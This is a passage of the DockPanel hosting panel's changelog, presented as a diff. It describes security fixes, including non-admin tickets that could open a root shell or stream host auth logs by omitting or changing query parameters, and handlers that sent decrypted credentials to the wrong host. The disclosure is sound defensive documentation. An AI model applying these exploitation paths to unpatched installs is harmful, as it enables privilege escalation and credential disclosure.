+through whichever host the browser named. This release closes the rest — roughly
+sixty more across git deploys, databases, backup orchestration, staging, stacks,
+mail, migration, logs and Docker apps — plus three shapes no census could see:
+
+- **`backup_destinations::test_connection`** contained no scope token at all. It
+  used the panel's own local client unconditionally, sending the **decrypted** S3
+  or SFTP credential to the panel for a destination a member will actually use,
+  and returned a green that described the panel's egress rather than the backup
+  host's.
+- **`databases::reset_password` and `query`** sent decrypted database passwords to
+  a machine the database does not run on. The agent's reset never verifies the old
+  password, so knowing a container name was the entire authorisation.
+- **`git_deploys::deploy`, `rollback` and `approve_deploy`** cloned, built and
+  deployed on the wrong host, injecting the deployment's full environment there.
+  `approve_deploy` additionally had no ownership term: one admin could approve
+  another's protected deploy.
+
+`migration::import` wrote vhosts, claimed domains and created database containers
+on the caller's selected host rather than the one holding the staged archive.
+`logs::log_stats` took a domain straight from a query parameter and never resolved
+a row at all.
+
+### Fixed — DNS records named the panel instead of the host
+
+Auto-DNS published the **panel's** public address for resources on any machine, so
+a site created on a member got an A record pointing at the wrong box and was
+unreachable at the name it had just been given. The delete path only removes a
+record whose content matches, so a member's record outlived its site as a dangling
+A record — a takeover surface rather than clutter. `servers.ip_address` was already
+being kept current by agent check-in and had simply never been consulted when
+publishing.
+
+### Fixed — domain claims asked one host about Docker apps
+
+Three of the claim's four legs were fleet-wide. The fourth — the only one that can
+see a Docker app, whose domain exists solely as a container label — asked the
+caller's host, so a domain held by an app on another member passed the check and
+the deploy replaced that app's nginx configuration.
+
+### Fixed — smaller consequences of the same mistake
+
+- Container quotas are per user but were counted on one host, so an account could
+  run its full limit on every server and read as within quota on each.
+- The port-availability preflight counted ports held by sites **fleet-wide**, so a
+  port free on this box was refused because another machine used it.
+- SMTP settings reached one host; the rest silently kept whatever they last had.
+- The SSH half of the login audit came from one server while the panel half was
+  fleet-wide, and the two were presented as siblings — a brute-force campaign
+  against a member's sshd was invisible unless that member happened to be selected.
+- Cloning a site across servers created the row and consumed the quota slot before
+  discovering the source docroot is on another machine. It is now refused up front.
+
+### Changed — the regression pin that was policing this class could not fail
+
+The suite's violation loops ran inside a pipeline, so the `FAIL` counter they
+incremented belonged to a subshell that then exited: the arm printed its ✗ marks
+and the suite still reported `FAIL 0` and exited 0. The one arm whose entire job
+is reporting violations had been unable to fail a build since it was written.
+
+The census itself is rebuilt. It used to require a handler to already use one of
+six correct-form spellings before it would be judged, which meant whole modules
+contributed zero members while holding live defects — and deleting a fixed
+handler's resolver call removed it from the census entirely, so deletion read as
+compliance. Membership now comes from the **schema**: any table carrying a
+`server_id` names a host, and a handler that reads such a row and then acts
+through an agent must take the host from the row. Two new arms cover what no
+route-scoped census can see — background services holding the local handle, and
+the agentless DNS shape.
+
+### Changed — DockPanel is now free software under the AGPL v3
+
+The licence moves from the Business Source License 1.1 to the **GNU Affero General
+Public License v3**. BSL was source-available, not open source: it carried a use
+restriction and a 2030 conversion date. That restriction and that date are both gone.
+
+You may now run, read, modify and redistribute DockPanel on any number of servers,
+commercially included, with no conversion date to wait for. The one obligation the
+AGPL adds over the GPL is the network clause: if you modify DockPanel and offer it
+to other people *as a service*, you must make your modified source available to
+those users. Running it — modified or not — for yourself or your own organisation
+obliges you nothing.
+
+`LICENSE` is now the verbatim AGPL-3.0 text. Package metadata across the agent,
+backend, CLI, panel frontend and website declares `AGPL-3.0-only` (the website had
+been declaring ISC, which was simply wrong).
+
+### Added — a way to support the project
+
+`.github/FUNDING.yml`, the README and the site's price section now point at GitHub
+Sponsors and PayPal. Nothing is gated behind them and nothing ever will be; the
+support note sits after the price figures and says what the money buys — test
+hardware, so releases are verified on more distributions before they ship.
+
+## [2.79.0] - 2026-08-07
+
+### Security — force-renew and revoke acted outside the administrator's boundary
+
+`POST /api/ssl/{id}/renew` and `DELETE /api/ssl/{id}` loaded the site with
+`SELECT * FROM sites WHERE id = $1` — no owner term and no server term — while
+three other handlers in the same file went through the shared caller predicate.
+An administrator in DockPanel is not a superuser: their reach is the local box
+plus the machines they registered themselves. With that predicate missing, the
+only thing holding that line was the server-scope extractor's check on a request
+header, which is not an authorisation the site's row ever agreed to.
+
+Revoke is the sharper half — it deletes the certificate through the agent and
+then blanks every `ssl_*` column on the row, so naming a site outside your
+boundary was a cross-boundary write even when the agent leg found nothing to
+delete. Both now resolve through the same predicate as their siblings.
+
+### Fixed — a site's host came from the browser, in seventy-one more places
+
+v2.78.0 fixed three handlers that answered *which site* from the row and *which
+host* from the server switcher. This release finishes the family: **71 handlers
+across 10 route modules** now take both answers from the row, through
+`site_agent_for_caller` / `agent_for_site_server`, which refuse an unreachable
+host rather than substituting the local one.
+
+The two questions agree on a single-box install, which is why this survived the
+whole life of the fleet feature. On a fleet they diverge, and the consequences
+ranged from dishonest to destructive:
+
+- `logs::site_logs` and `logs::search_site_logs` asked the wrong machine about a
+  domain it does not serve. Nothing comes back, and nothing is what a quiet site
+  looks like — a search for an attack in a remote site's access log returned a
+  confident "no matching lines".
+- `secrets::inject_to_site` wrote decrypted secrets into the nginx environment of
+  a machine the site does not run on. The one member of this family where a
+  misdispatch is a disclosure rather than a wrong answer.
+- `databases::create` built the container on the caller's host and then recorded
+  it against a site living elsewhere, leaving a row naming a container that is not
+  there while the wrong machine keeps the container and the port.
+- `sites::rename_domain` and `sites::add_alias` ran their domain-collision check
+  against one machine and wrote the vhost on another. `rename_domain`'s scope
+  binding was spelled `_server_id` and was **not** unused — the underscore silenced
+  the warning while the value was still being passed to the claim check.
+- The rest — file manager, cron, backup, WordPress, SSL provisioning and site
+  settings verbs — acted on the wrong host's copy of a domain.
+
+Handlers that legitimately want the caller's server keep it: server-level
+operations, the two streaming-ticket mints (whose scope id is the input to the
+local-only guard and whose handle is a signing key), site creation and cloning
+(where the server is a destination, not a lookup), and queries already pinned to
+the scoped server.
+
+### Fixed — two regression arms judged a hand-written list of subjects
+
+`unattended-host-scope-pin-e2e.sh` §J5 iterated two handlers from a literal list,
+three lines below a comment added in an earlier release warning never to do that.
+It now reuses the source-derived enumeration its neighbour already computes.
+Mutation-testing it surfaced something worse than a blind spot: the old arm
+grepped for a specific spelling of the discarded binding, so **deleting the
+parameter outright read as compliance** — it would have certified the exact
+mistake this release could have made.
+
+`wrong-host-dispatch-pin-e2e.sh` §C4 carried the comment *"Subjects derived FROM
+SOURCE, not from a literal list"* directly above a hardcoded three-element array.
+It judged three handlers while sixty-two call sites spelled the pattern, and
+because the comment used the vocabulary of the rule, the gap read as audited. It
+now censuses every site-resolving handler in every route module — 92 today — and
+asserts that census is non-empty before judging it. Deriving it is what found the
+last four defects above; the module-scoped search that preceded it did not see
+them.
+
+## [2.78.0] - 2026-08-06
+
+### Fixed — deleting a file could delete the whole site
+
+The file manager resolved a requested path, checked it was inside the site root,
+and acted on it. That check asks about containment, and containment is not
+identity: `.`, `""` and `/` all canonicalise to the site root itself, and a path
+always starts with itself, so all three passed. A delete handed one of them ran a
+recursive remove on the webroot and reported success. Destructive verbs now
+resolve through a variant that refuses the root and permits everything below it;
+listing the root, which is the file manager's default view, is unchanged.
+
+This one needs no fleet and no particular role — it is reachable on an ordinary
+single-server install.
+
+### Fixed — a site's files were resolved on one host and acted on from another
+
+Two questions had been collapsed into one. *Which site* is answered by a row the
+caller owns; *which host* was answered by the server the caller had selected in
+the UI. They agree on a single-box install, which is why the difference stayed
+invisible. On a fleet they part company: a client owns no server row — the only
+insert is administrator-gated — so no server header is sent and the local agent
+is used, while their site's row may name a different machine. An operator with
+two servers reaches the same state by opening a site on one while the switcher
+says the other, since the single-site read is not server-scoped even though both
+list reads are.
+
+The rule was already settled in this codebase. The webhook deploy path resolves
+the agent from the row and says why; the git-deploy update path does the same;
+every background service that walks these tables routes per row. It was the
+authenticated handlers — the buttons a person clicks — that never adopted it.
+Three of the worst now do:
+
+- **Deploy trigger** clones a repository into the site's webroot and runs its
+  build script as root. It sits in the same file as the webhook path that was
+  fixed for precisely this reason, and was left as it was.
+- **Site delete** aimed a site's database containers, its Redis index, its
+  firewall rule and its webroot at the selected host. The firewall step is the
+  one that is not namespaced by domain: it matched on port and action alone, so
+  it could remove an unrelated rule on the wrong machine.
+- **Stack delete** deleted its database record whatever the agent replied. Aimed
+  at the wrong host the removal found nothing, reported success, dropped the
+  record, and left the real host's containers and vhost running with nothing
+  naming them.
+
+A host that cannot be resolved is now refused rather than quietly replaced with
+the panel's own, because substituting is how one tenant's files end up on another
+tenant's machine.
+
+### Fixed — listing a folder could create it
+
+The list verb created the site root before resolving. Asked for a domain the host
+does not serve, it made `/var/www/<domain>` as root and answered `200` with an
+empty array — which then let write, create and upload land in a directory no
+vhost serves. Every other verb already failed loudly. That silence was the only
+reason a misdirected request could go unnoticed, and it is gone. A site whose
+document root was pointed somewhere other than `/var/www/<domain>` now says so
+instead of showing an empty invented folder.
+
+### Added
+
+- `wrong-host-dispatch-pin-e2e.sh` — 18 assertions. Thirteen are red at v2.77.0;
+  five are green at both tags on purpose, so a harness that measured nothing
+  could not read as a pass.
+
+## [2.77.0] - 2026-08-06
+
+### Fixed — a client's dashboard never drew, and the menus pointed the wrong way
+
+Reported on #51 by the operator the `client` role was built for: *"when i log in as
+a client .. i can see the sites, databases, but cant see the mail domain … The
+Dashboard also have no stats … when i click terminal the client cant access their
+section … Also file manager not available for their sites."*
+
+Four complaints, and they were not four bugs. Two were real, one was a page that
+already worked, and one was a feature that has never existed.
+
+**The dashboard showed a loading skeleton for ever.** The host `system` read is
+admin-only — `fetchRealtimeData` returns early for anybody else, and the live
+metrics socket refuses a non-admin — and the entire dashboard body was rendered
+behind `{!system ? skeleton : body}`. So a client got six pulsing placeholder
+cards and nothing underneath, permanently. Everything below that gate now renders
+for every role, with the host-level pieces carrying their own guards.
+
+Unhiding it exposed a second problem worth naming separately: four cells in the
+status grid did not merely go blank for a client, they made **affirmative false
+statements** — "up to date" from an update count that was never fetched, a mail
+queue of "0", bandwidth of "0 B / 0 B", "0/0 running" containers. A blank is
+honest; a zero is a claim. Those four are now admin-only, along with the setup
+checklist (four of its five steps land on pages a client cannot open) and the
+eight widget checkboxes that toggled panels a client can never draw.
+
+**The Terminal advertised the one shell a client cannot have, and hid the one it
+has.** A site owner has had a shell on every site they own for some time: it opens
+inside `/var/www/<domain>` as `www-data`, under a restricted shell with no
+privilege escalation. But the Terminal page auto-connected to the **server** shell
+on arrival, which is administrator-only by design — so a client reached the page
+from the sidebar and was refused instantly. The page now opens the caller's own
+first site when they are not an admin, the "Server root" option and the root SSH
+panel are admin-only, the snippet bar offers commands that work in the session you
+are actually in, and the refusal names the shell that does work instead of ending
+the sentence.
+
+⚠ The server-shell restriction itself is **unchanged and deliberate** — it is the
+v2.75.0 root-shell fix, and this release pins it with four regression arms that
+must stay green at both tags.
+
+**One menu-visibility rule, in one place.** The sidebar's role filter lived inline
+in a single hook, so the command palette — a second menu over the same pages — had
+no filter at all and offered `/users`, `/secrets`, `/security` and `/settings` to
+every account via Ctrl+K. Every one of those pages guards itself, so nothing
+leaked; what the palette handed out was a list of doors that refuse. Both menus now
+read one exported predicate over one registry. The dashboard's "Deploy App"
+shortcut had the same shape and is gated too — its sibling "Add Site" link, three
+lines below in the same file, had already been fixed for exactly this reason.
+
+**Not defects, stated plainly:** the file manager was never gated — all eight
+handlers take the ownership path and it is the first card on a site's page, in the
+reporter's own version. And DockPanel has no FTP, has never claimed one, and has no
+per-site system user to hang one on; the file manager and the per-site shell are
+the two ways in.
+
+### Security — the dashboard endpoint answered host-wide to every role
+
+Four reads in `dashboard.rs` were scoped by server but not by caller, so a
+non-admin received host facts through a route that looked tenant-shaped:
+
+- `docker_summary` made the very agent `/apps` call that `docker_apps::list_apps`
+  guards with `require_admin`, and guarded nothing — the ungated door to the list
+  next door.
+- `intelligence` forwarded the agent's `/diagnostics` blob verbatim, although that
+  endpoint is `AdminUser` on its own route.
+- the stale-backup count counted **every tenant's** sites on the box.
+- the host security-scan critical/warning totals reached every caller (that table
+  has no user column to filter by, so a non-admin now simply does not get one).
+
+Sections 1–4 of that handler were already `user_id`-scoped for everyone; these four
+were the exceptions. The scope is now decided once, at the top of the handler.
+
+### Documentation
+
+`docs/guides/roles-and-ownership.md` promised a client seven capabilities and two
+of them — **mail** and **containers** — are administrator-only and always were
+(`routes/mail.rs` is `AdminUser` on 42 of 42 handlers; every `docker_apps` handler
+calls `require_admin`). The guide is corrected, the client's per-site shell is
+documented for the first time, and a Withdrawn Claims row records it. The same
+sentence also survives in the `client` role migration's own comment, which
+**cannot** be corrected — `sqlx::migrate!` checksums applied migrations, so editing
+it would break the upgrade on every deployed install. It is left in place
+deliberately and recorded in `FEATURES.md` instead.
+
+New regression suite `tests/client-role-honesty-pin-e2e.sh` — 28 assertions,
+green at this commit and **red on 24 of them at v2.76.0**; the four §E arms are
+context guards that are green at both tags by design.
+
+## [2.76.0] - 2026-08-06
+
+### Security — a non-admin who owned one site could read the host's system logs
+
+The twin of v2.75.0's terminal escalation, in the log streamer. The panel signs a
+`log_stream` ticket that authorises one site's logs, resolving the site's domain
+under an ownership check — but it returned that domain as a field *beside* the
+signed ticket, and the agent read both the domain (from `?domain=`) and the log
+type (from `?type=`) out of the browser-controlled query string. Asking for
+`type=auth` with the domain omitted streamed `/var/log/auth.log`; `type=syslog`
+streamed `/var/log/syslog`; any type outside `access`/`error` fell through the
+agent's pass-through arm straight into the system-log allow-list.
+
+So any non-admin who owned a single site could mint a legitimate, ownership-checked
+log ticket for that site, then open the stream asking for a system log and read the
+host's SSH authentication log — every login, with source IPs — or the full syslog.
+The panel's "admin required for system log streaming" check only fires at mint time
+for a *site-less* ticket; it never travelled to the agent.
+
+Reproduced end to end on a fresh box against the published v2.75.0: a `user`-role
+account owning one site streamed `/var/log/auth.log` and `/var/log/syslog` with the
+domain omitted. The scope now rides **inside** the signed ticket — a site's domain,
+or the `@system` marker for the admin-only host logs — exactly as the terminal
+ticket's scope does since v2.75.0. The agent takes both the domain and the
+permitted log types from the signed scope: a site ticket streams only that site's
+own `access`/`error`/`php` logs and is refused (`403`) for anything else, and a
+lying `?domain=` for a different tenant is ignored. Re-driven fixed on the same
+box: the system-log requests are refused, a lying domain resolves to the ticket's
+own site, the site owner still streams its own logs, and admin system streaming
+still works. Legacy tickets from a pre-fix panel fall back to the old behaviour and
+log a warning, so an agent upgraded ahead of its panel keeps working.
+
+This needs the fix on both the panel and the agent. A single-box install updates
+both together; on a multi-server panel each managed server's agent must be updated
+to close it there.
+
+New pin: `tests/logs-scope-signed-pin-e2e.sh`, 10 assertions, each mutation-tested
+against a widening; PASS 3 / FAIL 7 at v2.75.0.
+
+## [2.75.0] - 2026-08-06
+
+### Security — a non-admin who owned one site could open a root shell on the host
+
+The terminal ticket the panel signs authorises a specific shell — a site's own
+directory, dropped to that site's `www-data`, or the admin root shell. But the
+panel returned the shell's scope (the site domain) as a field *beside* the signed
+ticket, and the agent read it from the `?domain=` query string. An empty domain
+there opens a **root** shell in `/root` with no privilege drop.
+
+So any non-admin who owned a single site could mint a legitimate, ownership-checked
+terminal ticket for that site, then open the WebSocket with the domain omitted and
+get an unrestricted root shell on the machine. The panel's "admin required" check
+only guards minting a ticket with *no* site; it never travelled to the agent, and
+the browser controls that query parameter.
+
+Reproduced end to end on a fresh box against the published v2.73.0: a `user`-role
+account owning one site got `uid=33(www-data)` with the domain present and
+`uid=0(root)` with it omitted. The scope now rides **inside** the signed ticket —
+the same place the recording flag already rides, and for the same reason — so the
+ownership check performed when the ticket is minted governs the shell that opens.
+Re-driven fixed on the same box: the domain-omitted connection now drops to
+`www-data`, the admin server shell still works, and a lying domain parameter is
+ignored.
+
+This needs the fix on both the panel and the agent. A single-box install updates
+both together; on a multi-server panel each managed server's agent must be updated
+to close it there.
+
+New pin: `tests/terminal-scope-signed-pin-e2e.sh`, 9 assertions, each
+mutation-tested against a widening; PASS 2 / FAIL 7 at v2.73.0.
+
+## [2.74.0] - 2026-08-06
+
+### Fixed — disabling a site did not take it offline, and where it did, the site came back by itself
+
+Two defects, both in the same place, found in that order.
+
+**Disabling a site did nothing at all on most installs.** The maintenance
+response written in the site's place named `listen 80`, while the vhost
+templates bind the server's own address — `listen 203.0.113.10:80` — whenever
+the panel knows it, which is the ordinary case. nginx attaches each server block
+to the socket its own directives name and picks a name among the blocks on the
+socket the request actually arrived on, so the maintenance block sat on the
+wildcard socket and was never consulted. The site went on serving its content,
+the panel displayed it as Disabled, and the agent reported success. Driven on a
+fresh box against the previous release: a disabled site answered `200` with its
+own page; giving the maintenance block the site's own address, and changing
+nothing else, turned the same request into `503 Site Disabled`. The response now
+takes its listeners — and its certificate, so a site with TLS can say it is
+disabled over HTTPS — from the configuration being replaced.
+
+**And where the maintenance response did work, the site came back on its own.**
+Disabling does not remove a site's nginx configuration. It parks the real body
+beside the live one and leaves a maintenance response in its place, so nginx
+keeps answering on the name while serving nothing.
+
+Five separate places rendered a complete vhost, and every one of them wrote to
+the live path without asking whether the operator had taken the site offline. So
+an ordinary settings change — PHP version, WAF mode, CSP, cache toggle, custom
+nginx, a git deploy, exposing a container, provisioning a certificate — replaced
+the maintenance response with a working site and reloaded nginx. The site went
+back on the internet immediately, and the panel went on displaying it as
+Disabled, because `sites.enabled` had exactly one reader in the whole backend:
+the guard inside the toggle that writes it.
+
+The unattended certificate-renewal loop did the same thing with nobody watching.
+On a stock install that is the only automatic renewal there is, and it rebuilds
+the vhost after every renewal — so a deliberately offline site with a certificate
+came back within about a week of that certificate entering its renewal window,
+and again on every sweep after that. With auto-heal switched on, within two
+minutes.
+
+Where a rendered vhost goes is now one decision in one place, and every writer
+asks it. A write for a disabled site refreshes the parked copy instead, and says
+so rather than reporting a reload that did not happen.
+
+The same change repairs a second defect. Re-enabling used to restore the body
+frozen at the moment the site went offline, silently reverting every setting
+changed in between — and a site that gained a certificate while offline came back
+on plain HTTP, because the frozen body has no TLS listener. Keeping the parked
+copy current means what comes back is the site as it is now. Renaming a disabled
+site also carries its parked body to the new name; previously it was stranded
+under the old one, where enabling would never look, leaving the site impossible
+to bring back from the panel at all.
+
+The panel side declines too: neither unattended loop pushes a vhost for a
+disabled site. That half arrives with the panel, so it protects managed servers
+before their agents are updated.
+
+- Disabled sites in the interface: the site detail header showed `active` for a
+  disabled site, and the dashboard counted it among the active ones and drew it
+  with a live dot. All three now agree with the banner that says the site is
+  disabled.
+- Password-authenticated SFTP backup destinations need `sshpass`, which only the
+  panel installer installed. Servers added with `install-agent.sh` now get it
+  too, and the prerequisite is documented for panels upgraded in place, since
+  `update.sh` upgrades binaries and installs no packages. (#93, partial)
+- Sixteen of the thirty-three regression-pin suites had no CI job and were run
+  only by hand. Every suite now runs on every push.
+
+New pin: `tests/site-disabled-stays-offline-pin-e2e.sh`, 19 assertions, each
+mutation-tested against a widening.
+
+## [2.73.0] - 2026-08-06
+
+### Fixed — a suspended account came back with the wrong role, and could arrange it itself
+
+Suspending an account overwrites `users.role`, which is the only record of what
+the account was, so the previous role had to be kept somewhere until the account
+was un-suspended. It was kept in `users.reset_token` — the same column the public
+password-reset flow writes.
+
+That flow checked no role at all. It was the one door in the whole authentication
+surface that didn't: sign-in, the session middleware, two-factor, passkeys and
+OAuth all refuse a suspended account explicitly. So a suspended user could open
+the ordinary *Forgot password* form, and the request alone replaced the record of
+their role with a reset token — no administrator involved, no sign-in required,
+and the reset did not even have to be completed. Whether the token was left in
+place or cleared by finishing the reset, the un-suspend that followed found
+nothing usable and fell back to `user`.
+
+The visible result was an administrator pressing **Unsuspend**, intending to put
+an account back as it was, and promoting or demoting it instead:
+
+- a `client` came back as a `user` — and a `user` may bring a **new domain** into
+  service, which is the single capability the `client` role exists to withhold;
+- an `admin` or a `reseller` came back as a plain `user`, losing everything.
+
+The second of those is much older than the first and needs no `client` role
+present, so it is the one more likely to have already happened on a running
+install.
+
+**What changed.** The suspend stash has a column of its own, `users.prior_role`,
+which nothing else writes. Suspending records the previous role and setting it
+back reads that record; the password-reset column is left to the password-reset
+flow. Both places that suspend an account — the panel and the WHMCS billing
+webhook — now go through one pair of statements rather than keeping a copy each.
+
+**An un-suspend never guesses.** If the previous role is unknown, the account
+stays suspended and says so, rather than being handed some default. There is no
+ordering of these roles that makes a guess safe in either direction: `user` is
+the value that caused this bug, and `client` is not simply "less" than `user` —
+reseller management is scoped to `role = 'user'`, so an account handed `client`
+would still be listed by its reseller and no longer be manageable by them. The
+operator is told instead, and can set the role from the user editor, which also
+lifts the suspension.
+
+Five smaller corrections came with it:
+
+- **The billing webhook records a previous role too, and gives back what it
+  recorded** instead of a hardcoded `user`. Its deny-list (refusing to *suspend*
+  an `admin` or `reseller`) is kept — it guards a different hazard, a lapsed
+  invoice locking an operator out of their own panel.
+- **Billing can return an ordinary account to service, but never restores an
+  `admin` or `reseller`.** That direction previously had no guard at all, so an
+  account the *panel* had deliberately suspended could be handed its operator
+  role back by anyone holding the webhook secret, leaving no audit record.
+- **Suspending an account now cuts its sessions on every path.** The session
+  check refuses a token whose claim says `suspended`, and a token issued while
+  the account was a `user` keeps saying `user` until it expires — so a
+  billing-driven suspension previously did nothing at all for up to two hours.
+  The panel had always revoked; the webhook never had.
+- **Billing-driven *un*-suspension now honours the `auto_suspend` setting**, as
+  suspension and termination already did, and **all three settings finally have
+  controls** on the WHMCS integration screen. They were stored and returned by the
+  API but had no checkbox, and the screen's own save omitted them — which reset
+  them to their defaults every time it was used.
+- **The password-reset endpoints refuse a suspended account** — silently, for
+  *Forgot password*, which answers identically for every address on purpose so it
+  cannot be used to discover which addresses exist. A visible refusal there would
+  have disclosed which accounts are suspended to anyone who asked.
+
+**Upgrading.** A migration adds the column and moves any intact record across. It
+also fills in accounts suspended by the billing webhook, which never recorded one
+— for those, `user` is not a guess but the value they already had and would have
+been given anyway. Accounts suspended through the panel whose record was
+destroyed by a password reset are left empty on purpose, and un-suspending one
+asks an administrator to choose rather than picking for them.
+
+Pinned by `tests/suspend-restore-pin-e2e.sh`.
+
+## [2.72.0] - 2026-08-06
+
+### Changed — an administrator can now repair any site on a machine they run
+
+Ownership decided both whose a site was **and** who could touch it. So handing a
+site to a `client` took it away from the administrator of the server it runs on:
+its page answered *Site not found*, its settings, logs, files, backups, SSL and
+terminal all refused, and the only thing left was to transfer it back. v2.71.0
+added a read-only list of every site on the box and called that the way back. The
+operator using the feature replied that an administrator who cannot fix a
+tenant's site is not much use on a server they are responsible for, and he was
+right ([#51](https://github.com/ovexro/dockpanel/issues/51)).
+
+Ownership still decides whose a site is, who sees it on their own Sites page, and
+who a transfer moves it to. It no longer decides what an operator may repair.
+
+Two bounds, both deliberate:
+
+- **It stops at the hardware you operate** — this box, plus any server you
+  registered yourself. Not a machine another administrator added.
+- **The admin's own Sites page is unchanged**, still listing only their own sites.
+  Everybody's is still behind Sites → *All sites on this server*.
+
+The rule is now **one predicate in one place**
+(`helpers::SITE_CALLER_PREDICATE`), shared by every per-site read. It replaces
+**eight** separately-named private copies of one query — two `site_domain`, four
+`get_site_domain`, two `get_site` — spread over thirteen modules, of which exactly
+one had drifted into being server-scoped while the rest were not. A guard
+duplicated per module is a guard that gets widened in one module.
+
+It also now reads `users.role` from the database rather than the role claim in the
+token, so a demoted account stops being an administrator immediately instead of
+when its session expires.
+
+### Fixed — every non-admin's first screen was an authorization error
+
+Signing in as anything other than an administrator landed you on a dashboard
+showing a red **"Admin access required"**, a heading stuck on *Loading…*, and
+buttons — Restart Nginx, Restart PHP, Reboot, Add Site — that could only fail.
+The dashboard asked the admin-only system endpoints as whoever was logged in, one
+of its error paths forwarded the API's own words to the page, and the poll
+reissued the whole set every five seconds, so it could not be dismissed.
+
+Present for every `user` and every `client` on every install. It is also, almost
+certainly, what was being reported as a client having no access to its own site:
+nothing was wrong with the site, and the panel said the most alarming thing it
+could on the way in.
+
+The dashboard now asks for what the account may have, and no page surfaces an
+authorization refusal aimed at somebody else as its own error.
+
+### Changed — the ownership pin now tests the change it was written to catch
+
+`site-transfer-visibility-pin-e2e.sh` §B existed to fail if a future release
+widened the site reads. It could not: its arms asserted a `user_id` predicate was
+**present**, and every realistic widening adds a disjunct and leaves it present.
+The mutation recorded as proof of that section tested deletion, which it does
+catch, rather than widening, which it did not — and one arm was passing on an
+unrelated query in the same function.
+
+Rewritten around the invariant instead of the token: one definition of the
+predicate, no module holding a private copy, the admin arm bounded to the
+machine, the role read from the database, and the admin's own list still scoped.
+Six arms, each mutation-tested to redden alone.
+
+## [2.71.1] - 2026-08-05
+
+### Fixed — v2.71.0's own fix did not take effect until a minute after sign-in
+
+The self-heal that drops a stale server selection runs in an effect keyed on
+mount. **Signing in is a state change, not a remount**, so after v2.71.0 a client
+signing in on a browser that had held an admin session still sent the stale
+`X-Server-Id` — and still saw *"Server not found or access denied"* — until the
+60-second refresh happened to fire. The fix was correct and arrived a minute late,
+which for a first impression is the same as not arriving.
+
+The server list is per-account (`GET /api/servers` is scoped to the caller), so
+the effect that reads it is now keyed on the signed-in account. Found by tracing
+the fix's own timing rather than by re-reading the diff; a 20th arm pins it.
+
+## [2.71.0] - 2026-08-05
+
+### Fixed — the `client` role shipped in v2.69.0 could not be used, and the handover it enabled was one-way (GitHub #51)
+
+Both defects were reported from the field by the operator who had just adopted
+the feature, within a day of it landing. Both are ours.
+
+- **A client signed in and every request was refused with *"Server not found or
+  access denied"*.** The selected server is kept in `localStorage`, which is
+  per-BROWSER and not per-account, and `GET /api/servers` is scoped to the
+  caller — no non-admin owns a `servers` row, so a client's server list comes
+  back empty. `ServerContext` only ever *corrected* a stale selection when it
+  could find a local server to replace it with, and with an empty list it could
+  not, so the id the admin had left on that browser survived and was attached to
+  every request as `X-Server-Id`. Anyone testing a client account on their own
+  machine hit this immediately; a browser that had never held an admin session
+  did not, which is why it passed a first test and failed the second. The stale
+  id is now dropped when the account's own list cannot back it, and cleared on
+  sign-out so it never crosses accounts in the first place.
+
+- **Transferring a site removed it from the admin's panel with no way back.**
+  Ownership is a single axis and every site read asks whether the row belongs to
+  the caller — which is exactly why a `client` needed no other change, and also
+  meant that an admin who handed a site over lost it from their own list, got
+  *Site not found* on its page, and could no longer reach the **Transfer**
+  control, because that control was rendered only on that page. `docs/guides/
+  roles-and-ownership.md` promised the opposite in print, and so did the
+  handler's own doc comment.
+
+### Added — Sites → **All sites on this server**
+
+An admin-only, read-only view of every site on the box with its owner beside it,
+and a **Transfer** button on each row — so a handover can be undone. It is a
+list, not a back door: `GET /api/admin/sites` is a narrow projection, and no
+per-site read was widened. An admin still cannot open, edit or delete a site
+they do not own; they transfer it back to themselves first.
+
+- The transfer recipient is now **picked from the account list** rather than
+  typed, on both the new list and the site page. The endpoint answered 404 on an
+  unknown address, so a text field could only ever fail after the fact.
+- New pin suite `site-transfer-visibility-pin-e2e.sh` (19 assertions). Transfer
+  had **no** regression coverage at all before this release. Its §B arm is a
+  negative one — it exists to go red if a future change widens a site read for
+  admins instead of adding a view.
+- `docs/guides/roles-and-ownership.md`: the role table's *Sees* column described
+  a capability the code has never had, for `admin` **and** for `reseller` (a
+  reseller sees its sub-accounts and a site *count*, not their sites). Corrected,
+  with the way back documented.
+
+## [2.70.0] - 2026-08-05
+
+### Fixed — the public status page was open on every install, and the documented switch did not govern it (SECURITY)
+
+⚠ **Upgrade impact: `/status` is now closed until you turn it on.** If you were
+relying on a status page you never explicitly enabled, re-enable it under
+**Settings → Public Status Page**. Read the rest of this entry first — it says
+what that page has been publishing.
+
+- **Four routes answered with no authentication and exactly one of them checked
+  anything.** `/api/status-page` read `settings.status_page_enabled` and failed
+  closed — that is the switch the Settings UI writes and the guide documents.
+  But `/status`, the page an actual visitor loads, is served by
+  `/api/status-page/public`, which read a **different** flag,
+  `status_page_config.enabled`. That flag defaults `TRUE` in the column *and*
+  again in the fallback used when the table has no row at all, and no migration
+  ever seeds the table — so it failed open twice, and a panel published its
+  status page **from first boot, with no operator action.**
+  `/api/status-page/subscribe` and `/unsubscribe` read nothing at all.
+
+- **What that page publishes is not just uptime.** The alert engine, the
+  auto-healer, the uptime checker and the backup executor all open incidents
+  marked visible on the status page automatically, and their titles name your
+  infrastructure — *"Service mariadb is stopped on This Server"*, *"Disk at 53%
+  on This Server"*. On our own demo host, `/api/status-page/public` was serving
+  five unresolved incidents, the oldest from 2026-05-02, to anyone who asked.
+
+- **The publish decision now lives in one place**,
+  `services::public_status::require_enabled`, and all four public routes call
+  it. It fails closed on an absent setting, on a value that is not the literal
+  `"true"`, and on a query that errors. `status_page_config.enabled` survives as
+  a display preference — it hides the `/status` page while leaving the monitor
+  endpoint up — but it is no longer a publish decision.
+  `tests/status-page-gate-pin-e2e.sh` computes the route list from the router
+  and fails the build if a fifth public status route is ever added without the
+  gate.
+
+- **Ungated `subscribe` wrote rows.** An unauthenticated caller could insert
+  arbitrary addresses into `status_page_subscribers` as `verified = TRUE`, and
+  delete anyone else's, on an install whose status page was never turned on.
+
+### Fixed — an off switch that reported success and did nothing
+
+- `PUT /api/status-page/config` ran `INSERT ... ON CONFLICT DO NOTHING` with **no
+  conflict target**, against a table whose only unique index was the
+  `gen_random_uuid()` primary key — so the clause could never fire and every save
+  inserted another row. The `UPDATE` that followed then matched N rows and
+  returned an arbitrary one, while the public reader took an **unordered**
+  `LIMIT 1`. An operator could untick *Enabled*, get a `200` and a form showing
+  it off, and still be publishing from a different row.
+- Migration `20260805120000_status_page_config_unique.sql` dedupes — keeping the
+  **oldest** row per operator, which is the one the public reader now selects, so
+  the migration cannot change what a panel publishes — then makes `user_id`
+  unique. `update_config` names a real conflict target; the public read is
+  ordered.
+
+### Fixed — docs and controls that described a different product
+
+- `docs/guides/status-page.md` promised *"When disabled, visiting `/status`
+  returns a 404."* That was false for four and a half months. It is true now, and
+  the guide carries an upgrade note saying it was not, plus a **What gets
